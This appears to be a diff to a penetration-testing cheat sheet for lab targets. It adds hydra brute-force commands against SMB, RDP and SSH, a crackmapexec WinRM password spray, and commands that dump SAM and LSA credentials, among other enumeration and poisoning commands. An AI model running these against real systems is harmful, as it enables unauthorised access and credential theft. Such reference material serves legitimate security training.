@@ -17,6 +17,8 @@ cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
 cme smb 10.10.10.178 -u 'a' -p ''
 rpcclient -U '' -N <ip>
 enumdomusers
+hydra -L user.list -P password.list smb://10.129.42.197
+scanner/smb/smb_login
 ```
 ### FTP enumeration
 ```bash
@@ -76,6 +78,7 @@ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
 nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
 ./rdp-sec-check.pl 10.129.201.248
 hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+hydra -L user.list -P password.list rdp://10.129.42.197
 ```
 ### MSSQL
 ```bash
@@ -109,6 +112,7 @@ use auxiliary/scanner/ipmi/ipmi_dumphashes
 ```bash
 ./ssh-audit.py 10.129.14.132
 ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
+hydra -L user.list -P password.list -u -f ssh://10.129.42.197 -t 4
 ```
 #### Rsync
 ```bash
@@ -118,23 +122,16 @@ rlogin 10.0.17.2 -l htb-student
 rwho
 rusers -al 10.0.17.5
 ```
+### WINRM
+```bash
+crackmapexec winrm 10.129.42.197 -u user.list -p password.list
+```
 ### Network poisoning
 ```bash
 responder -I tun0
 ```
 ### Extract possible usernames
-```
-NameSurname
-Name.Surname
-NamSur
-Nam.Sur
-NSurname
-N.Surname
-SurnameName
-Surname.Name
-SurnameN
-Surname.N
-```
+``` NameSurname, Name.Surname, NamSur, Nam.Sur, NSurname, N.Surname, SurnameName, Surname.Name, SurnameN, Surname.N ```
 ### Kerbrute
 ```bash
 nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.real='test.local', userdb=usernames.txt <ip>
@@ -160,9 +157,10 @@ cp test/* /mnt/sync/writable_share
 for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
 ```
 ## Enumerating with creds
-### Extract SAM
+### Extract SAM and LSA
 ```bash
-crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+crackmapexec smb 10.10.110.17 --local-auth -u administrator -p 'Password123!' --sam
+crackmapexec smb 10.129.42.198 --local-auth -u user -p password --lsa
 ```
 ### PTH
 ```bash
